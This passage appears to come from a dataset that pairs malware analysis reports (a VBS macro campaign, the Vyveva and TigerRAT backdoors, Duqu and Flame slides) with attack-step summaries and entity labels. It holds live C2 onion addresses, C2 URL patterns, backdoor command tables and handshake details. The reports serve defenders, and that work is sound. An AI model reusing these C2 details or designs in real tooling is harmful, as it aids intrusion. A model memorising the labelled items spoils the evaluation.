function. This function first executes explorer.exe (without apparent functional reason), and then calls a function to choose one IP from an array which will rotate in case of the chosen IP not replying to the subsequent C2 connection. This connection to the C2 server will use an HTTP GET request using the following structure:http://{ IP_address }/getCommand?guid={ recon_string }HTTP GET communication from VBS sampleAs aforementioned, in the case of an empty reply, it will rotate the IP address and try again with the next. Otherwise it will deobfuscate the reply and call a function to execute it by creating a WScript.Shell object to call cmd:As also seen on the deobfuscated snippet, it will output the result into a txt file and immediately read its content to return it to the calling function in order to include the result and send it to the C2 server. The next contact will use the POST HTTP method and will follow a slightly different structure and the command output in the body:http://{ IP_address }/getTargetInfo?guid={ recon_string }&status={ flag_value }4/6HTTP POST communication from VBS sampleInterestingly, the value renamed by us as “flag_value” will be included as the “state” value within the POST request. In the script file, it is a variable that is initialized to 0 in every collected sample, and is always set to 1 before executing the received command and sending the result in the POST request. Other than this, it is not modified or used in the script file. However, it is checked during the renamed “whoami_wrap” for the initial host recon at the beginning of the script. It is compared with the value 126, and in case of resolving True, it will display the following message box.Malicious VBS “alternative functionality”The only implemented functionality in every analyzed sample is the #1, which will use WMI to display the following information about the infected system:Code snippet for the “alternative functionality”Such a small script with incomplete functionality, after almost two years being used for different campaigns could suggest that the attackers might modify its functionality in a later stage, based on the obtained information from the infected host or, at least, use it to download and drop the next infection stage.","1. The attack starts with a compressed file containing a malicious Word document with VBA macros. 2. The VBA macros write obfuscated VBScripts to startup folders or ProgramData. 3. The dropped VBScripts contain preset country codes indicating intended targets. 4. The scripts execute recon commands like whoami and send results to C2 servers. 5. The C2 servers send back commands that are executed, with output sent back to C2. 6. The scripts have unused functionality to collect system info via WMI if a flag is set, suggesting later modification. 7. The campaigns have continued from late 2020 to early 2022, indicating an ongoing operation. ",valid_60,"['The attack', 'a compressed file', 'a malicious Word document', 'VBA macros', 'VBS', 'ProgramData', 'the script', 'commands', 'the C2 server', 'output', 'WMI', '0']",The attack; a compressed file; a malicious Word document; VBA macros; VBS; ProgramData; the script; commands; the C2 server; output; WMI; 0.
"4/9/2021(Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurity(Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoorwelivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoorApril 8, 2021ESET researchers have discovered a previously undocumented Lazarus backdoor, which they have dubbed Vyveva, being used to attack a freight logistics company in South Africa. The backdoor consists of multiple components and communicates with its C&C server via the Tor network. So far, we have been able to find its installer, loader and main payload – a backdoor with a TorSocket DLL. The previously unknown attack was discovered in June 2020.Although Vyveva has been used since at least December 2018, its initial compromise vector is still unknown. Our telemetry data suggests targeted deployment as we found only two victim machines, both of which are servers owned by a freight logistics company located in South Africa. The backdoor features capabilities for file exfiltration, timestomping, gathering information about the victim computer and its drives, and other common backdoor functionality such as running arbitrary code specified by the malware’s operators. This indicates that the intent of the operation is most likely espionage.This blogpost provides the first public, technical analysis of Vyveva’s components.Attribution to LazarusVyveva shares multiple code similarities with older Lazarus samples that are detected by ESET products as the NukeSped malware family. However, the similarities do not end there: the use of fake TLS in network communication, command line execution chains, and the way of using encryption and Tor services all point towards Lazarus; hence we can attribute Vyveva to this APT group with high confidence.An example of the numerous code similarities can be seen in Figure 1 – resolving uniquely named Tor library exports.92F5469DBEFDCEE1343934BE149AFC1241CC8497 msobjs.drx Vyveva backdoor BF98EA1326E5F8C351E68C79B5D1E0164C7BE728 taskhosts.exe Win32/NukeSped.HV trojanFigure 1. Hex-Rays decompilation showing similarity between Vyveva (left) and NukeSped sample (right)url you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurityTechnical analysisUp until now, we have managed to find three of the multiple components comprising Vyveva – its installer, loader and backdoor. The installer is the earliest chronological stage found and since it expects other components to be already present on the machine, it suggests the existence of an earlier, unknown stage – a dropper. The loader serves to decrypt the backdoor using a simple XOR decryption algorithm.Figure 2 provides a closer look at the functionality of the installer, the backdoor, and the Tor library.InstallerFigure 2. Overview of Vyveva componentsThe main purposes of the installer are twofold: it creates a service that ensures persistence of the backdoor loader, and it stores the embedded, default backdoor configuration in the registry.url you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurityTo create a legitimate-looking service, its attributes, such as service name and display name, are formed using a combination of words from the attributes of existing services, which are randomly selected. It is also possible to specify these attributes to the installer via command line parameters - dll, -svc, -disp, -desc, and -group. We observed the following in the wild, with these parameters:<SYSDIR>\powerctl.exe -svc powerctl -dll powerctl.dllAs for the latter task, the installer first sets the configuration infection ID, which uniquely identifies each victim, to a randomly generated value, and then stores it in the registry, as shown in Figure 3.[HKLM\SOFTWARE\Microsoft\DirectX] UsageMask = <CONFIG_DATA>Figure 3. Configuration registry valueOne of the entries in the configuration is a list of encrypted C&C servers: for example, the installer sample we analyzed is configured with the following C&Cs:4bjt2rceijktwedi[.]onion:80 cwwpxpxuswo7b6tr[.]onion:80Backdoor functionalityThe backdoor, Vyveva’s main component, connects to C&C servers and executes commands issued by the threat actors. It features 23 commands, some of which are asynchronous and executed in their own threads. Most of them are ordinary commands for file and process operations or information gathering, but there is also a less common command for file timestomping. It can copy creation/write/access time metadata from a “donor” file to a destination file or use a random date in the years 2000—2004.Other noteworthy commands are Vyveva’s file upload command, and command 0x26. The file upload command is capable of exfiltrating directories recursively and supports file extension filtering – for example, Office documents only. As for command 0x26, it indicates the existence of another, unknown component that we have not yet observed at the time of writing.The full list of commands is shown in Table 1.Table 1. Vyveva backdoor commandsIDDescription0x03 Reply to “ping” from server0x10 Get information about computer – username, computer name, IP, code page, OS version,OS architecture, tick count, time zone, current directory0x11 Get information about drives – type, size, name, serial number, filesystem type0x12 Write data to specified file, optionally timestomp.url you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurityIDDescription0x13Upload specified file or directory • File – size, last write time, content • Directory stats – total files size, file count, directory count - For each entry – name, attributes - Directories – recurse into directories - Files – size, last write time, contentOptions • Use compression for file content (zlib 1.2.5) • File extension filter (whitelist/blacklist) • Recursion flag0x14 Get listing of specified directory • name, attributes, write time • Directories – is nonempty • Files – size0x15 Set current directory to specified directory0x16 Create specified process0x17 Get information about running processes – PID, PPID, executable file path0x18 Terminate process(es) by PID or executable file path0x19 Create process with redirected output and upload the outputThe command uses a format string which hints at execution through cmd.exe • ""%param0% /c ""%param1% > %tmp_fpath%"" 2>&1"" If the output is empty, unique string ""\x0D\x0A"" is uploaded instead0x1A Delete specified path. File deletion methods:• delete only • overwrite & move & delete0x1B Copy creation/write/access time metadata from source file or directory to destination file ordirectory. If the source doesn’t exist, random time in year 2000-2004 is used for creation & last write time, access time is unchanged.0x1C Get info about specified path:• File – attributes, creation/write/access time, type, size • Directory / Drive – total files size, file count, directory count (with optional extension filtering and recursion)0x1D Set current configuration blob, save to registry0x1E Get current configuration blob0x1F Enable/disable drive watchdog (configuration field enable_drive_watchdog)0x20 Enable/disable session watchdog (configuration field enable_session_watchdog)0x21 Set configuration value related to delay of backdoor execution (configuration fielddelay_until_time)0x23 Store data used by asynchronous command (related to commands 0x12, 0x13)0x24 Stop executing asynchronous command (related to commands 0x12, 0x13)url you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurityIDDescription0x25 Set configuration value related to delay between failed C&C connection attempts(configuration field wait_minutes)0x26If <SYSDIR>\wsdchngr.drx exists • Delete configuration registry value • Delete backdoor file (self delete) • Delete loader file • Read, decrypt, PE-load wsdchngr.drx and call SamIPromote export in a new thread • Exit current threadOf particular interest are the backdoor’s watchdogs, which can be optionally enabled or disabled. There is a drive watchdog used to monitor newly connected and disconnected drives, and a session watchdog monitoring the number of active sessions (i.e. logged-on users). These components can trigger a connection to the C&C server outside the regular, preconfigured three-minute interval, and on new drive and session events.ConfigurationThe configuration of the backdoor, which is initially set by the installer, is read from the registry value (shown in Figure 3). When the configuration is modified by a C&C command, the value stored in the registry is updated. An example configuration and its structure are shown in Figure 4.Figure 4. Configuration structure and annotated exampleThe wait_minutes field specifies the time to wait before next connection to the C&C after a failed connection attempt. If the execution of the backdoor needs to be delayed until a particular time and date, it can be specified in the delay_until_time field. The encrypted_cncs field is an encrypted string, which contains semicolon-separated C&Cs.Tor libraryVyveva uses the Tor library, which is based on the official Tor source code, to communicate with a C&C server selected at random from the configuration. It contacts the C&C at three-minute intervals, sending information about the victim computer and its drives before receiving commands. Theurl you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecuritybackdoor’s export directory contains the TorSocket.dll with self-explanatory exports close_ch, connect_ch, open_ch, read_ch, write_ch.ConclusionVyveva constitutes yet another addition to Lazarus’s extensive malware arsenal. Attacking a company in South Africa also illustrates the broad geographical targeting of this APT group.For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com.Indicators of Compromise (IoCs)SamplesSHA-1FilenameESET detection nameDescriptionDAD50AD3682A3F20B2F35BE2A94B89E2B1A73067powerctl.exe Win32/NukeSped.HX Installer69529EED679B0C7F1ACC1FD782A4B443CEC0CF83 powerctl.dllWin32/NukeSped.HX Loader(x86)043ADDFB93A10D187DDE4999D78096077F26E9FDwwanauth.dll Win64/NukeSped.EQ Loader(x64)1E3785FC4FE5AB8DAB31DDDD68257F9A7FC5BF59 wwansec.dll Win32/NukeSped.HX Loader(x86)4D7ADD8145CB096359EBC3E4D44E19C2735E0377 msobjs.drx-Backdoor (encrypted)92F5469DBEFDCEE1343934BE149AFC1241CC8497 msobjs.drxWin32/NukeSped.HX Backdoor MZ header)A5CE1DF767C89BF29D40DC4FA6EAECC9C8979552 JET76C5.tmp -Backdoor Tor library (encrypted)66D17344A7CE55D05A324E1C6BE2ECD817E72680JET76C5.tmp Win32/NukeSped.HY Backdoor MZ header)Filenames%WINDIR%\System32\powerctl.exe %WINDIR%\SysWOW64\powerctl.exe %WINDIR%\System32\power.dat %WINDIR%\SysWOW64\power.daturl you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurity%WINDIR%\System32\wwanauth.dll %WINDIR%\SysWOW64\wwanauth.dll %WINDIR%\System32\wwansec.dll %WINDIR%\SysWOW64\wwansec.dll %WINDIR%\System32\powerctl.dll %WINDIR%\SysWOW64\powerctl.dll%WINDIR%\System32\JET76C5.tmp %WINDIR%\SysWOW64\JET76C5.tmp %WINDIR%\System32\msobjs.drx %WINDIR%\SysWOW64\msobjs.drxMITRE ATT&CK techniquesThis table was built using version 8 of the MITRE ATT&CK framework.TacticIDNameDescriptionExecutionT1569.002 System Services: Service ExecutionVyveva loader executes via a service.T1106Native APIPersistence T1543.003 Create or Modify System Process: Windows ServiceVyveva backdoor uses the CreateProcessA API to execute files.Vyveva installer creates a new service to establish persistence for its loader.Defense EvasionT1140Deobfuscate/Decode Files or InformationVyveva decrypts strings and components (backdoor, Tor library).T1070.006 Indicator Removalon Host: TimestompT1036.004 Masquerading:Masquerade Task or ServiceVyveva backdoor can timestomp files.Vyveva installer can create a service with attributes mimicking existing services.T1112T1027Modify RegistryVyveva stores its configuration in the registry.Obfuscated Files or InformationVyveva has encrypted strings and components.DiscoveryT1083File and Directory DiscoveryVyveva backdoor can obtain file and directory listings.T1057T1082T1016T1033Process DiscoveryVyveva backdoor can list running processes.System Information DiscoveryVyveva backdoor can obtain system information, including computer name, ANSI code page, OS version and architecture.System Network Configuration DiscoverySystem Owner/User DiscoveryVyveva backdoor can obtain the local IP address of the victim computer.Vyveva backdoor can obtain victim's username.url you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor | WeLiveSecurityTacticIDT1124NameSystem Time DiscoveryCollectionT1560.002 Archive Collected Data: Archive via LibraryDescriptionVyveva backdoor can obtain system time and time zone.Vyveva backdoor can compress files with zlib before sending to C&C.T1005T1025Data from Local SystemVyveva backdoor can collect files from computer.Data from Removable MediaVyveva backdoor can notify C&C about newly inserted removable media and collect files from them.Command and ControlT1573.001 Encrypted Channel:Symmetric CryptographyVyveva backdoor encrypts C&C traffic using XOR.T1573.002 Encrypted Channel:Asymmetric CryptographyVyveva backdoor communicates with C&C via Tor.ExfiltrationT1041Exfiltration Over C2 ChannelVyveva exfiltrates data to C&C server.8 Apr 2021 - 11:30AMNewsletterDiscussionurl ",1. An initial dropper compromises the victim system and installs the Vyveva installer component. 2. The installer creates a service for persistence and stores encrypted configuration in the registry. 3. The service executes the loader component. 4. The loader decrypts and executes the Vyveva backdoor component. 5. The backdoor connects to a C2 server over Tor and sends reconnaissance information. 6. The C2 server sends commands for the backdoor to execute on the victim system. 7. The backdoor exfiltrates data and files back to the C2 server over the Tor connection. ,valid_16,"['Compromise', 'Vyveva installer', 'the installer', 'Create', 'a service', 'persistence', 'stores', 'configuration', 'the registry', 'The loader', 'Vyveva backdoor', 'the backdoor', 'C2', 'information', 'commands', 'data', 'files']",Compromise; Vyveva installer; the installer; Create; a service; persistence; stores; configuration; the registry; The loader; Vyveva backdoor; the backdoor; C2; information; commands; data; files.
"TigerRAT – Advanced Adversaries on the Prowlblogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.htmlDecember 3, 2021SummaryOn September 5th, 2021, the Korea Internet & Security Agency (KISA) released a report on a new threat they dubbed TigerRAT. The newly found malware shares similarities with malware previously reported by Kaspersky and Malwarebytes. Kaspersky has previously attributed those malware samples to Andariel, a threat actor group the Korean Financial Security Institute has identified as being a sub-group of Lazarus. TigerRAT appears to have been used from late 2020 onwards.VMware’s Threat Analysis Unit identifies TigerRAT as a payload associated with broader campaign of attacks against target enterprises. The TigerRAT payload capability includes the ability to manipulate files, execute remote commands, log keystrokes and remotely view and control the screen. TigerRAT may be blocked by VMware Carbon Black (see Figure 8).Notably this malware, and the overall attack, originates from a loader application that utilizes a unique approach to storing the payload. Within the TigerRAT sample, configuration data for Command and Control (C2) communications is stored encrypted within the malware, and communications with the C2 server are customized to appear like HTTP web traffic.VMware’s Threat Analysis Unit performed a deep analysis of the TigerRAT malware to document its internal operations for comparison to other malware families in the wild.When considering how TigerRAT may be used in the wild, defenders should recognize that the TigerRAT malware will be used by attackers as part of a broader campaign of attacks and that along the kill-chain, a wide variety of other malware types and attack techniques are also likely to be used. This is a key point when evaluating how such campaigns can be detected and disrupted.LoaderLoader structureIn the case of sample , the TigerRAT payload data is stored in a section named “data”. The payload structure is a 4-byte size, a 16-byte key, and then base64 encoded data. The size is the total length of the base64 data.4 bytes16 bytesNN bytesSize of base64 encoded data (NN) Decryption key base64 encoded dataThe screenshot below (Figure 1) shows the size in red, the decryption key in green, and the base64 data in blue.1/12Figure 1: LoaderLoader functionThe Loader’s purpose is to decrypt the final TigerRAT payload and execute it in memory. The data is loaded, base64 decoded and then the 16-byte key is used to decrypt the data with a simple XOR. The decoded payload is a PE file and after decrypting the loader will jump to the entry point.Variance of loaders in the wild2/12The loader sample Malwarebytes reported on had almost identical code to that analyzed here, with the notable difference being that the base64 data was stored as overlay data after all the regular PE data. The embedded payload in the Malware bytes sample also differed. Refer to the Malwarebytes post for additional detail.TigerRATThe embedded PE is referred to as TigerRAT by the KISA report. A handful of different samples were found with compilation dates ranging from the end of 2020 to the beginning of 2021, with the only notable differences between different samples being the encrypted C2 information, and the DES/RC4 keys used for encryption and decryption.The malware is written in C++ and makes use of only a handful of classes. At startup, a main class is created with references to the classes below.Class nameDescriptionProtocolTcpPurePerforms all the communication with the C2 server.CryptorDESCryptorRC4Used to decrypt encrypted strings and data in the program.Used to encrypt information sent to the C2 server and decrypt received commands.IDGeneratorAdapterCreates a unique ID for the victim machine used during C2 communication initialization.ModuleUpdateHandles C2 commands related to shutting down and self-deletion.ModuleInformationHandles C2 commands related to gathering victim machine information.ModuleShellHandles C2 commands related to executing commands.ModuleFileManagerHandles C2 commands related to file manipulation and upload and download of files from the victim machine.ModuleKeyLoggerHandles C2 commands related to starting and stopping keylogging functionality.ModuleSocksTunnelHandles C2 commands related to starting and stopping a socks tunnel.ModuleScreenCapture Handles C2 commands related to remote screen capturing and keyboard eventinjection.ModulePortForwarder Handles C2 commands related to starting and stopping port forwarding.Table 1: TigerRAT classesAll of the Module classes inherit from a common base class and the main class stores an array of Module instances that are used during C2 communication. The code makes heavy use of threading when running actions based on C2 commands.C2 CommunicationDuring the main class initialization, the C2 IP addresses are decrypted using the CryptorDES class and stored in the main class. When that initialization is finished, the malware then attempts to initiate the network connection to the C2 server. The malware first tries to connect to one of the decrypted C2 IP addresses on port3/12443 and then performs a handshake with the C2 server. The malware starts by sending HTTP 1.1 /index.php? member=sbi2009 SSL3.3.7\x00 and then the C2 server responds with HTTP 1.1 200 OK SSL2.1\x00.Following a successful initial handshake, the malware sends a 16-byte hash of the RC4 key being used and expects to get back a hardcoded 7-byte value. In the case of all currently found samples, the malware expects the 7-byte value “xPPygOn”.The handshake process can be seen from the perspective of the C2 server by running a mockc2 TigerRAT server (Figure 2).mockc2> debug on [+] Debug output on mockc2> listener start tigerrat 443 [DEBUG] Server listening [i] connection from x.x.x.x:55067 [DEBUG] received00000000 48 54 54 50 20 31 2e 31 20 2f 69 6e 64 65 78 2e |HTTP 1.1 /index.| 00000010 70 68 70 3f 6d 65 6d 62 65 72 3d 73 62 69 32 30 |php?member=sbi20| 00000020 30 39 20 53 53 4c 33 2e 33 2e 37 00 |09 SSL3.3.7.| [DEBUG] sent 00000000 48 54 54 50 20 31 2e 31 20 32 30 30 20 4f 4b 20 |HTTP 1.1 200 OK | 00000010 53 53 4c 32 2e 31 00 |SSL2.1.| [DEBUG] received 00000000 f2 7c 29 1f a5 75 fa 20 23 f7 7b 5b fa 5b e1 4a |.|) u. #.{[.[.J| 00000000 78 50 50 79 67 4f 6e 00 |xPPygOn.|Figure 2: TigerRAT handshakeAfter the handshake process has been completed successfully, the malware will proceed to send all further data in a standard command format and encrypted using the CryptorRC4 class. A single 32-byte RC4 key is used to initialize two separate running RC4 ciphers. One is used to decrypt incoming traffic and the other is used to encrypt outgoing traffic. The encrypted traffic has the following format (Figure 3):struct packet { };Figure 3: Encrypted traffic structureOnce decrypted the command format is as follows (Figure 4):struct command { uint32 module; uint32 opcode;4/12uint32 size; uint8 *data; };Figure 4: Command structureAfter the handshake, the malware sends to the C2 server a unique victim machine identifier previously generated by the IDGeneratorAdapter class. The unique ID is generated by calling the GetAdaptersInfo API and getting the hardware address for one of the network devices on the victim machine (Figure 5).[DEBUG] received 00000000 18 00 00 00 9d c6 28 3a a8 14 21 6c 4f 27 81 0a |……(: !lO’ | 00000010 5c 4d 4d 42 cd 2e 65 fa fd 50 b0 29 |\MMB e P.)| [DEBUG] TigerRAT Command [DEBUG] Module: 0x0 [DEBUG] Opcode: 0x1 [DEBUG] Size: 0xc [DEBUG] Data: 00000000 f0 18 98 80 95 32 00 00 00 00 00 00 |… 2……|Figure 5: TigerRAT victim IDAfter the handshake process and upload of the victim ID, the malware initiates a heartbeat thread to send periodic packets to the C2 server, as well as a receive thread to read and process commands sent back from the C2 server. The subsequent actions of the malware will depend on the commands received from the C2 server; refer “Commands”. An example of a heartbeat command can be seen below (Figure 6):[DEBUG] received 00000000 0c 00 00 00 a5 31 6d a7 8f cd d4 70 aa e1 d4 56 |… 1m….p…V| [DEBUG] TigerRAT Command [DEBUG] Module: 0x0 [DEBUG] Opcode: 0x10 DEBUG] Size: 0x0Figure 6: TigerRAT heartbeatCommands Each Module class has a unique ID associated with it. This ID is set in the command structure sent from the C2 server down to the malware. The complete list of Module IDs can be seen below:Module ID Module Name0x10x20x30x40x5ModuleUpdateModuleInformationModuleShellModuleFileManagerModuleKeyLogger5/120x60x70xaModuleSocksTunnelModuleScreenCaptureModulePortForwarderTable 2: Module IDsThe following tables list the various opcodes used by the different Module classes and their function.ModuleUpdateOpcode Description0x200x30Calls ExitProcessDelete itself and exitTable 3: ModuleUpdate opcodesModuleInformationOpcode Description0x100x200x300x40Retrieve victim’s computer name using GetComputerNameWRetrieve victim’s Windows version using RtlGetVersionRetrieve victiom’s adapter info using GetAdaptersInfoRetrieve victim’s username using GetUserNameWTable 4: ModuleInformation opcodesModuleShellOpcode Description0x100x200x300x40Execute a commandSet current directoryGet current directoryTest TCP connectionTable 5: ModuleShell opcodesModuleFileManagerOpcode Description0x10Retrieve drive info6/120x200x300x400x420x430x500x570x5f0x600x630x700x800x90List filesDelete fileStart file upload to victim machineWrite data to uploaded fileFinish file upload to victim machineDownload file from victim machineSet offset in file to downloadWait for file transfers to finishCall CreateProcessWCall CreateProcessAsUserWDownload a directory from victim machineFind filesFind filesTable 6: ModuleFileManager opcodesModuleKeyLoggerOpcode Description0x100x110x200x210x250x32Initialize keyloggerSet keylogger flagStop keyloggerSet keylogger flagRetrieve keylogger outputRetrieve keylogger fileTable 7: ModuleKeyLogger opcodesModuleSocksTunnelOpcode Description0x100x200x30Start socks tunnelForward dataStop socks tunnel7/12Table 8: ModuleSocksTunnel opcodesModuleScreenCaptureOpcode Description0x100x200x500x520x530x600x610x620x630x640x650x660x67Start screen captureStop screen captureModify mouseModify mouseModify mouseSend VK_ESCAPE using keybd_eventSend VK_MENU + VK_TAB using keybd_eventSend VK_CONTROL + A using keybd_eventSend VK_RSHIFT + VK_DELETE using keybd_eventSend VK_MENU + VK_F4 using keybd_eventSend VK_RETURN using keybd_eventSend VK_SPACE using keybd_eventSend VK_TAB using keybd_eventTable 9: ModuleScreenCapture opcodesModulePortForwarderOpcode Description0x110x200x30Retrieve port forwarding statusStart port forwardingStop port forwardingTable 10: ModulePortForwarder opcodesDetection and BlockingThe TigerRAT malware may be detected . Figure 7 below shows TigerRAT launching multiple command interpreters in response to simulated commands sent from the mock C2 server. VMware Carbon Black Cloud can be configured to block unknown software attempting to run command interpreters as seen in Figure 8 below.8/12Figure 7: Process tree of TigerRAT executing remote commands9/12Figure 8: VMware Carbon Black Cloud blocking execution on unknown application attempting to run a command interpreterMITRE ATT&CK TIDsTIDTacticT1059.003 ExecutionDescriptionCommand and Scripting Interpreter: Windows Command ","1. TigerRAT is delivered via a custom loader that decrypts the payload stored inside the loader binary. 2. The decrypted payload establishes an encrypted C2 channel to communicate with the command server. 3. TigerRAT receives modules and commands from the C2 server to carry out functions like keylogging, file manipulation, and screenshot capturing. 4. Data collected from the victim machine is encrypted and exfiltrated back to the C2 server. ",valid_18,"['tigerrat', 'red', 'decrypt', 'the payload', 'the loader', 'modules', 'commands', 'the C2 server', 'keylogging', 'file manipulation', 'data', 'the victim machine']",tigerrat; red; decrypt; the payload; the loader; modules; commands; the C2 server; keylogging; file manipulation; data; the victim machine.
"Targeted cyber attacks:examples and challenges aheadLevente ButtyánBudapest University of Technology and EconomicsDepartment of Networked Systems and ServicesLaboratory of Cryptography and System Security (CrySyS Lab)www.crysys.hujoint work with Boldizsár Bencsáth, Gábor Pék, and Márk FélegyháziCyber attacks cyber crime– financial motivations hacktivism (e.g., Anonymous)– political motivations targeted attacks– espionage– sabotage– DoSLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu2Targeted cyber attacks highly customized tools and intrusion techniques– multiple different exploits in each campaign – often using zero-day (or very fresh) exploits stealthy operation and persistence– reduced risk of detection – average time of undetected compromise is ~1 year well-funded and well-staffed organizations behind– military or state intelligence organizations – large companiesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu3Malware often used mechansim in targeted attacks types– virus, worm, Trojan,  delivery methods– attachment of a targeted e-mail• spear phishing based on social engineering– redirection to a malicious web page• drive-by-download– through a compromised legitimate site• watering hole attacks– through an infected USB drive infection by exploiting known or publicly unknown vulnerabilities– bugs in the OS or in applications (e.g., web browser, office suite) – often allow for executing arbitrary code (e.g., installer of the malware)Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu4Phases of targeted attackssource: TrendMicro Security Intelligence BlogLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu5The problemRSA breachOpera breachattack on Lockheed MartinGaussEvilGrabGh0st RATOpsinessKimsukyIcefog SykipotStuxnetDuquComodo attackDarkSeoul attackRed OctoberFlameRARSTONEDigiNotar compromisesource: Symantec Internet Security Threat Report 2013NetTravelerAdobe breachLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu6Questions Why are these attacks so successful?  How do they work? What sort of tricks do they use?  Why and how do our traditional security tools fail?  What can be done to mitigate the problem?  Are we at the dawn of a paradigm shift in security?Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu7Outline some personal experience with sophisticated malwareused in targeted attacks lessons learned in these experiences challenges for the security research communityLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu8Duqu (2011)Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu9Summary of contributionsdiscovery, naming, and first analysis of Duqu – creates files with names starting with ~DQ – striking similarities to Stuxnet, but different objective – advanced cyber espionage tool (keystrokes, screen shots, files) – 60-page report shared with major AV vendors and Microsoft – ~20 known victims, mainly in Iran, but also in Europeidentification of the dropper – MS Word document with a 0-day Windows kernel exploit – anonymization of the dropper before sharing with Microsoftdevelopment of the Duqu Detector Toolkit – focus on heuristic behavior based detection – detects live Duqu instances and remains of earlier infections – also detects Stuxnet !! – open-source distribution (to be usable in critical infrastructures) – 12000+ downloads from 150 countriesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu10Duqu components identifiedRegistry datajminet7.sys (loader)KeyloggerRegistry datainternal DLL (keylogger)cmi4432.sys (loader)netp191.pnf (payload)netp192.pnf(config)cmi4432.pnf (payload)cmi4464.pnf(config)nep191_ res302.dllnetp191.zdata.mzcmi4432_ res302.dllcmi4432_ 203627 (exe?)(comm module)Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu11Static analysis of binariesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu12Duqu – jminet7 driver structureLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu13Duqu – netp191 main module uncompressedLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu14Similarity to StuxnetLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu15Duqu Detector Toolkit instead of signature based identification, focus onbehavior based anomaly detection – e.g., PNF files without corresponding INF files– detection of encrypted components and registry entries– false positives are acceptable, given the critical nature of potentialtargets simple components (tools) provided in C source code  evaluation results– detect Duqu and Stuxnet.A– low number of false positive alarms the toolkit has been downloaded from more than 12000distinct IP addresses distributed over 150 countriesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu16How could Duqu have been detected? manual inspection of the system status– multiple running instances of lsass.exe– suspicious function calls into sortEA74.nls in the stack trace of amalicious lsass instance (checked with Sysinternal’s Process Monitor)– by checking the bootlog, one can figure out that the parentprocess of lsass.exe is svchost.exe, whose parent process is services.exe, which injects code into lsass.exe, alg.exe, imapi.exe, spoolsv.exe and other svchost.exe instances we also tested the hook detection performance of ~40 freely available rootkit detection tools on Duqu infected computers – several tools identified anomalies that would be very suspiciousfor a knowledgeable system administratorLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu17Hook detection resultsLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu18The Duqu experience we have never done this sort of work before– no hands-on experience with state-of-the-art tools (e.g., IDApro)– didn’t know the information sharing practices in the AV industry– not sure about our expected role given the supposed creator(s)and purpose of Duqu we worked under extreme time pressure “Luck favors the prepared mind” (Pasteur) increased visibility– media coverage– invitations to various places and visits of different “entities”Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu19Flame (aka sKyWIper) (2012)Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu20Flame (aka sKyWIper) (2012) another info-stealer malware– activates microphones and web cam– logs key strokes– takes screen shots– extracts geolocation data from images– sends and receives commands and data through Bluetooth data saved in SQL databases  data transport via network connections and USB pen drive  infects computers by masquerading as a proxy for Windowsupdate – uses a fake certificate that looks like a valid Microsoft certificate– needed advanced collision attack on the MD5 hash function thousands of victims, mostly in Iran, Israel (Palestine territories), andSudan, but also in Hungary!Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu21Flame vs. Duqu (Stuxnet) Flame is a platform different form Duqu (and Stuxnet)– larger code size – use of Lua scripting language – use of SQLite databases – larger C&C infrastructure – C&C servers run different OS (Ubuntu vs. CentOS Linux) they may be two implementations for the same requirementspecification developed by two different teams the two teams may not be independent– Kaspersky researchers found chunks of code from a 2009 Stuxnetvariant inside Flame– CrySyS Lab identified an encryption routine that is the same inFlame and StuxnetLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu22The fake certificate used by Flamechains up to the MS rootcan be used for code signing!looks validLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu23MD5 collision attackLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hufigure taken from a presentation of Alex Sotirov24Rapid SSL attack in 2008 collaboration of hackers andacademics led by Alex Sotirov and Marc Stevens demonstrated a practical MD5collision attack against the RapidSSL CA – resulted in a fake SSL certificatetrusted by all browsers generating a collision required 2days on a cluster of 200 PS3s – equivalent to about $20Kcomputing capacity on Amazon EC2source: presentation of Alex SotirovLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium 